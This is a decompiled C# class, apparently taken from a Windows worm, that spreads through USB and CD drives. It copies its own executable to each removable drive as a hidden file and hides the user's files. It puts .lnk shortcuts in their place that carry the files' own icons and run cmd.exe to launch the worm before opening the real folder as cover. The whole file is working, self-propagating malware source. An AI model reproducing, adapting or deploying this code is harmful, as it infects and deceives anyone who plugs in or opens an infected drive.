using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace w;

public class USB
{
	public class DRV
	{
		public string drive;

		public List<string> Files;

		public List<string> lnk;

		public DRV()
		{
			Files = new List<string>();
			lnk = new List<string>();
		}
	}

	private bool Off;

	private Thread thread;

	public string ExeName;

	public Collection dr;

	public USB()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Off = false;
		thread = null;
		dr = new Collection();
	}

	public void Start()
	{
		if (thread == null)
		{
			thread = new Thread(usb, 1);
			thread.Start();
		}
	}

	public void clean()
	{
		Off = true;
		while (thread != null)
		{
			Thread.Sleep(1);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (!driveInfo.IsReady || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
				{
					continue;
				}
				if (File.Exists(driveInfo.Name + ExeName))
				{
					File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Normal);
					File.Delete(driveInfo.Name + ExeName);
				}
				string[] files = Directory.GetFiles(driveInfo.Name);
				foreach (string text in files)
				{
					try
					{
						File.SetAttributes(text, FileAttributes.Normal);
						if (text.ToLower().EndsWith(".lnk"))
						{
							File.Delete(text);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] directories = Directory.GetDirectories(driveInfo.Name);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						directoryInfo.Attributes = FileAttributes.Normal;
						directoryInfo = null;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void usb()
	{
		thread = null;
		clean();
		thread = Thread.CurrentThread;
		Off = false;
		while (!Off)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					DRV dRV;
					if (!dr.Contains(driveInfo.Name.ToLower()))
					{
						dRV = new DRV();
						dRV.drive = driveInfo.Name;
						dr.Add((object)dRV, driveInfo.Name.ToLower(), (object)null, (object)null);
					}
					else
					{
						dRV = (DRV)dr.get_Item(driveInfo.Name.ToLower());
					}
					if (Off)
					{
						goto end_IL_002f;
					}
					try
					{
						if (!driveInfo.IsReady || !(((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							continue;
						}
						try
						{
							if (!File.Exists(driveInfo.Name + ExeName))
							{
								File.Copy(Application.get_ExecutablePath(), driveInfo.Name + ExeName, overwrite: true);
								File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Hidden);
							}
							string[] files = Directory.GetFiles(driveInfo.Name);
							foreach (string text in files)
							{
								if (!((Operators.CompareString(Path.GetExtension(text)!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + ExeName.ToLower(), false) != 0)))
								{
									continue;
								}
								if (!dRV.Files.Contains(new FileInfo(text).get_Name()))
								{
									if (dRV.Files.Count < 20)
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
										dRV.Files.Add(new FileInfo(text).get_Name());
										File.SetAttributes(text, FileAttributes.Hidden);
										dRV.lnk.Add(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"));
									}
								}
								else if (dRV.Files.Contains(new FileInfo(text).get_Name()))
								{
									if (File.GetAttributes(text) != FileAttributes.Hidden)
									{
										File.SetAttributes(text, FileAttributes.Hidden);
									}
									if (!File.Exists(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"))
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
									}
									else if (Operators.CompareString(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"), dRV.lnk[dRV.Files.IndexOf(new FileInfo(text).get_Name())], false) != 0)
									{
										lnk(driveInfo, text, GetIcon(Path.GetExtension(text)));
									}
								}
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3000);
			continue;
			end_IL_002f:
			break;
		}
		thread = null;
	}

	public object lnk(DriveInfo x, string xx, string ico)
	{
		try
		{
			File.Delete(x.Name + new FileInfo(xx).get_Name() + ".lnk");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		object obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { x.Name + new FileInfo(xx).get_Name() + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
		NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + ExeName.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(xx).get_Name() + "\" & exit" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { ico }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
		object result = default(object);
		return result;
	}

	public string GetIcon(string ext)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", writable: false);
			string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, writable: false)!.GetValue(""), (object)"\\DefaultIcon\\")))!.GetValue("", ""));
			if (!text.Contains(","))
			{
				text += ",0";
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
